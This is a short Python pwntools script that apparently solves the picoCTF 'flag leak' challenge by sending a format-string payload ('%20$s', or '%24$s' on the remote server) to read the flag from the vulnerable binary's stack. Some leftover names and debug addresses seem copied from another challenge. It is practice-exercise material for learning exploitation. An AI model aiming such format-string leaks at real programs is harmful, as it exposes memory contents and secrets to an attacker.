#fermat-strings
import struct
from pwn import *
from queue import Queue
from threading import Thread

#####################################################change directory#################################3
level = "flag leak"
ip = "saturn.picoctf.net:58120"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

########################################operation mode#########################################
args.DEBUG = False
args.REMOTE = False
#####################################setup solution################################################
context.arch = 'i386'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/vuln")
#######################################start process#############################################
def conn():
    if args.REMOTE:
        global libc
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, gdbscript="break *0x400947\nc\nx/24wx 0x601058\n")
    else:
        return process([binary.path])
r = conn()
################################simple format string vuln####################################
canary_offset = 20
if args.REMOTE:
    canary_offset = 24
payload = f"%{canary_offset}$s".encode()
r.sendlineafter(">>", payload)
#####################collecting result and shell#######################

flag = r.recvall()
log.info(flag)
r.close()